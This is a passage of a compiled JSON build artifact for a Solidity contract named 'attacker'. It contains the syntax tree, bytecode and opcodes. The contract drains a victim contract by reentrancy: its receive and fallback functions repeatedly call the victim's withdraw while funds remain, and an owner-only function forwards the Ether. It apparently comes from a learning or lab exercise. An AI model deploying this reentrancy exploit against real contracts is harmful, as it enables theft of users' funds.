                          },
                          "value": "10"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "**",
                        "rightExpression": {
                          "hexValue": "3138",
                          "id": 107,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "922:2:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_18_by_1",
                            "typeString": "int_const 18"
                          },
                          "value": "18"
                        },
                        "src": "918:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_1000000000000000000_by_1",
                          "typeString": "int_const 1000000000000000000"
                        }
                      },
                      "src": "914:10:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_1000000000000000000_by_1",
                        "typeString": "int_const 1000000000000000000"
                      }
                    },
                    "src": "895:29:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 117,
                  "nodeType": "IfStatement",
                  "src": "891:78:0",
                  "trueBody": {
                    "id": 116,
                    "nodeType": "Block",
                    "src": "926:43:0",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [],
                          "expression": {
                            "argumentTypes": [],
                            "expression": {
                              "id": 111,
                              "name": "bobolon",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 11,
                              "src": "940:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_Ivictim_$8",
                                "typeString": "contract Ivictim"
                              }
                            },
                            "id": 113,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "withdraw",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 7,
                            "src": "940:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                              "typeString": "function () external"
                            }
                          },
                          "id": 114,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "940:18:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 115,
                        "nodeType": "ExpressionStatement",
                        "src": "940:18:0"
                      }
                    ]
                  }
                }
              ]
            },
            "id": 119,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "chekBalance",
            "nameLocation": "843:11:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 101,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 100,
                  "mutability": "mutable",
                  "name": "_victim",
                  "nameLocation": "863:7:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 119,
                  "src": "855:15:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 99,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "855:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "854:17:0"
            },
            "returnParameters": {
              "id": 102,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "881:0:0"
            },
            "scope": 144,
            "src": "834:141:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 142,
              "nodeType": "Block",
              "src": "1023:124:0",
              "statements": [
                {
                  "assignments": [
                    125,
                    null
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 125,
                      "mutability": "mutable",
                      "name": "sent",
                      "nameLocation": "1039:4:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 142,
                      "src": "1034:9:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      },
                      "typeName": {
                        "id": 124,
                        "name": "bool",
                        "nodeType": "ElementaryTypeName",
                        "src": "1034:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      "visibility": "internal"
                    },
                    null
                  ],
                  "id": 136,
                  "initialValue": {
                    "arguments": [
                      {
                        "hexValue": "",
                        "id": 134,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1090:2:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
                          "typeString": "literal_string \"\""
                        },
                        "value": ""
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
                          "typeString": "literal_string \"\""
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
                            "typeString": "literal_string \"\""
                          }
                        ],
                        "expression": {
                          "id": 126,
                          "name": "owner",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 15,
                          "src": "1049:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "id": 127,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "call",
                        "nodeType": "MemberAccess",
                        "src": "1049:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
                          "typeString": "function (bytes memory) payable returns (bool,bytes memory)"
                        }
                      },
                      "id": 133,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "names": [
                        "value"
                      ],
                      "nodeType": "FunctionCallOptions",
                      "options": [
                        {
                          "expression": {
                            "arguments": [
                              {
                                "id": 130,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "1075:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_attacker_$144",
                                  "typeString": "contract attacker"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_attacker_$144",
                                  "typeString": "contract attacker"
                                }
                              ],
                              "id": 129,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "1067:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 128,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "1067:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 131,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "1067:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          },
                          "id": 132,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balance",
                          "nodeType": "MemberAccess",
                          "src": "1067:21:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        }
                      ],
                      "src": "1049:40:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
                        "typeString": "function (bytes memory) payable returns (bool,bytes memory)"
                      }
                    },
                    "id": 135,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1049:44:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
                      "typeString": "tuple(bool,bytes memory)"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1033:60:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 138,
                        "name": "sent",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 125,
                        "src": "1111:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "4661696c656420746f2073656e64204574686572",
                        "id": 139,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1117:22:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb",
                          "typeString": "literal_string \"Failed to send Ether\""
                        },
                        "value": "Failed to send Ether"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb",
                          "typeString": "literal_string \"Failed to send Ether\""
                        }
                      ],
                      "id": 137,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "1103:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 140,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1103:37:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 141,
                  "nodeType": "ExpressionStatement",
                  "src": "1103:37:0"
                }
              ]
            },
            "functionSelector": "d2eef3a0",
            "id": 143,
            "implemented": true,
            "kind": "function",
            "modifiers": [
              {
                "id": 122,
                "kind": "modifierInvocation",
                "modifierName": {
                  "id": 121,
                  "name": "onlyOwner",
                  "nodeType": "IdentifierPath",
                  "referencedDeclaration": 48,
                  "src": "1013:9:0"
                },
                "nodeType": "ModifierInvocation",
                "src": "1013:9:0"
              }
            ],
            "name": "withdrawing",
            "nameLocation": "990:11:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 120,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1001:2:0"
            },
            "returnParameters": {
              "id": 123,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1023:0:0"
            },
            "scope": 144,
            "src": "981:166:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 145,
        "src": "155:994:0",
        "usedErrors": []
      }
    ],
    "src": "31:1119:0"
  },
  "bytecode": "60c060405234801561001057600080fd5b5060405161050238038061050283398101604081905261002f9161005a565b600080546001600160a01b039092166001600160a01b0319909216821790556080523360a05261008a565b60006020828403121561006c57600080fd5b81516001600160a01b038116811461008357600080fd5b9392505050565b60805160a0516104406100c26000396000818161016b015281816102f7015261035401526000818160420152606d01526104406000f3fe6080604052600436106100385760003560e01c80634de260a2146100915780636e10374314610099578063d2eef3a0146100d557610068565b36610068576100667f00000000000000000000000000000000000000000000000000000000000000006100ea565b005b6100667f00000000000000000000000000000000000000000000000000000000000000006100ea565b610066610160565b3480156100a557600080fd5b506000546100b9906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b3480156100e157600080fd5b506100666102ec565b670de0b6b3a7640000816001600160a01b0316311061015d576000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561014457600080fd5b505af1158015610158573d6000803e3d6000fd5b505050505b50565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146101c95760405162461bcd60e51b81526020600482015260096024820152682737ba1037bbb732b960b91b60448201526064015b60405180910390fd5b670de0b6b3a76400003410156102215760405162461bcd60e51b815260206004820152601c60248201527f57726f6e672076616c75652c206974206d757374206265203e3d20310000000060448201526064016101c0565b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561027757600080fd5b505af115801561028b573d6000803e3d6000fd5b50506000805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b1580156102d257600080fd5b505af11580156102e6573d6000803e3d6000fd5b50505050565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146103505760405162461bcd60e51b81526020600482015260096024820152682737ba1037bbb732b960b91b60448201526064016101c0565b60007f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03164760405160006040518083038185875af1925050503d80600081146103bd576040519150601f19603f3d011682016040523d82523d6000602084013e6103c2565b606091505b505090508061015d5760405162461bcd60e51b81526020600482015260146024820152732330b4b632b2103a379039b2b7321022ba3432b960611b60448201526064016101c056fea2646970667358221220dc3dfd8ef4a1894364cba10495a9932b089586d41e5c16f467bc3bad5d6fbded64736f6c634300080a0033",
  "bytecodeSha1": "5b4403ebe4a907a2f9ecf4e92c415c2e44b511e8",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.10+commit.fc410830"
  },
  "contractName": "attacker",
  "coverageMap": {
    "branches": {
      "0": {
        "attacker.chekBalance": {
          "7": [
            895,
            924,
            false
          ]
        },
        "attacker.hack": {
          "8": [
            691,
            714,
            true
          ]
        },
        "attacker.withdrawing": {
          "9": [
            438,
            457,
            true
          ],
          "10": [
            1111,
            1115,
            true
          ]
        }
      }
    },
    "statements": {
      "0": {
        "attacker.<fallback>": {
          "1": [
            533,
            550
          ]
        },
        "attacker.<receive>": {
          "0": [
            600,
            617
          ]
        },
        "attacker.chekBalance": {
          "2": [
            940,
            958
          ]
        },
        "attacker.hack": {
          "3": [
            683,
            747
          ],
          "4": [
            757,
            793
          ],
          "5": [
            803,
            821
          ]
        },
        "attacker.withdrawing": {
          "6": [
            1103,
            1140
          ]
        }
      }
    }
  },
  "dependencies": [
    "Ivictim"
  ],
  "deployedBytecode": "6080604052600436106100385760003560e01c80634de260a2146100915780636e10374314610099578063d2eef3a0146100d557610068565b36610068576100667f00000000000000000000000000000000000000000000000000000000000000006100ea565b005b6100667f00000000000000000000000000000000000000000000000000000000000000006100ea565b610066610160565b3480156100a557600080fd5b506000546100b9906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b3480156100e157600080fd5b506100666102ec565b670de0b6b3a7640000816001600160a01b0316311061015d576000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561014457600080fd5b505af1158015610158573d6000803e3d6000fd5b505050505b50565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146101c95760405162461bcd60e51b81526020600482015260096024820152682737ba1037bbb732b960b91b60448201526064015b60405180910390fd5b670de0b6b3a76400003410156102215760405162461bcd60e51b815260206004820152601c60248201527f57726f6e672076616c75652c206974206d757374206265203e3d20310000000060448201526064016101c0565b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561027757600080fd5b505af115801561028b573d6000803e3d6000fd5b50506000805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b1580156102d257600080fd5b505af11580156102e6573d6000803e3d6000fd5b50505050565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146103505760405162461bcd60e51b81526020600482015260096024820152682737ba1037bbb732b960b91b60448201526064016101c0565b60007f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03164760405160006040518083038185875af1925050503d80600081146103bd576040519150601f19603f3d011682016040523d82523d6000602084013e6103c2565b606091505b505090508061015d5760405162461bcd60e51b81526020600482015260146024820152732330b4b632b2103a379039b2b7321022ba3432b960611b60448201526064016101c056fea2646970667358221220dc3dfd8ef4a1894364cba10495a9932b089586d41e5c16f467bc3bad5d6fbded64736f6c634300080a0033",
  "deployedSourceMap": "155:994:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;600:17;612:4;600:11;:17::i;:::-;155:994;;533:17;545:4;533:11;:17::i;630:198::-;;;:::i;179:22::-;;;;;;;;;;-1:-1:-1;179:22:0;;;;-1:-1:-1;;;;;179:22:0;;;;;;-1:-1:-1;;;;;191:32:1;;;173:51;;161:2;146:18;179:22:0;;;;;;;981:166;;;;;;;;;;;;;:::i;834:141::-;914:10;895:7;-1:-1:-1;;;;;895:15:0;;:29;891:78;;940:7;;;:18;;;-1:-1:-1;;;940:18:0;;;;-1:-1:-1;;;;;940:7:0;;;;:16;;:18;;;;;;;;;;:7;;:18;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;891:78;834:141;:::o;630:198::-;438:10;-1:-1:-1;;;;;452:5:0;438:19;;430:41;;;;-1:-1:-1;;;430:41:0;;437:2:1;430:41:0;;;419:21:1;476:1;456:18;;;449:29;-1:-1:-1;;;494:18:1;;;487:39;543:18;;430:41:0;;;;;;;;;704:10:::1;691:9;:23;;683:64;;;::::0;-1:-1:-1;;;683:64:0;;774:2:1;683:64:0::1;::::0;::::1;756:21:1::0;813:2;793:18;;;786:30;852;832:18;;;825:58;900:18;;683:64:0::1;572:352:1::0;683:64:0::1;757:7;::::0;::::1;;;;;;-1:-1:-1::0;;;;;757:7:0::1;-1:-1:-1::0;;;;;757:15:0::1;;780:10;757:36;;;;;;;;;;;;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;-1:-1:-1::0;;803:7:0::1;::::0;;:18:::1;::::0;;-1:-1:-1;;;803:18:0;;;;-1:-1:-1;;;;;803:7:0;;::::1;::::0;-1:-1:-1;803:16:0::1;::::0;-1:-1:-1;803:18:0::1;::::0;;::::1;::::0;-1:-1:-1;803:18:0;;;;;;:7;;:18;::::1;;::::0;::::1;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;;;;;630:198::o:0;981:166::-;438:10;-1:-1:-1;;;;;452:5:0;438:19;;430:41;;;;-1:-1:-1;;;430:41:0;;437:2:1;430:41:0;;;419:21:1;476:1;456:18;;;449:29;-1:-1:-1;;;494:18:1;;;487:39;543:18;;430:41:0;235:332:1;430:41:0;1034:9:::1;1049:5;-1:-1:-1::0;;;;;1049:10:0::1;1067:21;1049:44;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1033:60;;;1111:4;1103:37;;;::::0;-1:-1:-1;;;1103:37:0;;1341:2:1;1103:37:0::1;::::0;::::1;1323:21:1::0;1380:2;1360:18;;;1353:30;-1:-1:-1;;;1399:18:1;;;1392:50;1459:18;;1103:37:0::1;1139:344:1::0",
  "language": "Solidity",
  "natspec": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "offset": [
    155,
    1149
  ],
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4DE260A2 EQ PUSH2 0x91 JUMPI DUP1 PUSH4 0x6E103743 EQ PUSH2 0x99 JUMPI DUP1 PUSH4 0xD2EEF3A0 EQ PUSH2 0xD5 JUMPI PUSH2 0x68 JUMP JUMPDEST CALLDATASIZE PUSH2 0x68 JUMPI PUSH2 0x66 PUSH32 0x0 PUSH2 0xEA JUMP JUMPDEST STOP JUMPDEST PUSH2 0x66 PUSH32 0x0 PUSH2 0xEA JUMP JUMPDEST PUSH2 0x66 PUSH2 0x160 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xA5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 SLOAD PUSH2 0xB9 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xE1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x66 PUSH2 0x2EC JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE LT PUSH2 0x15D JUMPI PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x3CCFD60B PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP3 PUSH4 0x3CCFD60B SWAP3 PUSH1 0x4 DUP1 DUP5 ADD SWAP4 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x144 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x158 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST POP JUMP JUMPDEST CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND EQ PUSH2 0x1C9 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x9 PUSH1 0x24 DUP3 ADD MSTORE PUSH9 0x2737BA1037BBB732B9 PUSH1 0xB9 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x221 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1C PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x57726F6E672076616C75652C206974206D757374206265203E3D203100000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x1C0 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x277 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x28B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x3CCFD60B PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP6 POP PUSH4 0x3CCFD60B SWAP5 POP PUSH1 0x4 DUP1 DUP3 ADD SWAP5 POP SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2D2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2E6 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND EQ PUSH2 0x350 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x9 PUSH1 0x24 DUP3 ADD MSTORE PUSH9 0x2737BA1037BBB732B9 PUSH1 0xB9 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x1C0 JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SELFBALANCE PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x3BD JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x3C2 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x15D JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x2330B4B632B2103A379039B2B7321022BA3432B9 PUSH1 0x61 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x1C0 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDC RETURNDATASIZE REVERT DUP15 DELEGATECALL LOG1 DUP10 NUMBER PUSH5 0xCBA10495A9 SWAP4 0x2B ADDMOD SWAP6 DUP7 0xD4 0x1E 0x5C AND DELEGATECALL PUSH8 0xBC3BAD5D6FBDED64 PUSH20 0x6F6C634300080A00330000000000000000000000 ",
  "pcMap": {
    "0": {
      "offset": [
        155,
        1149
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x80"
    },
    "2": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "7": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "8": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "LT",
      "path": "0"
    },
    "9": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x38"
    },
    "12": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "13": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "15": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "CALLDATALOAD",
      "path": "0"
    },
    "16": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "18": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "SHR",
      "path": "0"
    },
    "19": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "DUP1",
      "path": "0"
    },
    "20": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x4DE260A2"
    },
    "25": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "EQ",
      "path": "0"
    },
    "26": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x91"
    },
    "29": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "30": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "DUP1",
      "path": "0"
    },
    "31": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x6E103743"
    },
    "36": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "EQ",
      "path": "0"
    },
    "37": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x99"
    },
    "40": {
      "fn": null,
      "offset": [
        155,
        1149
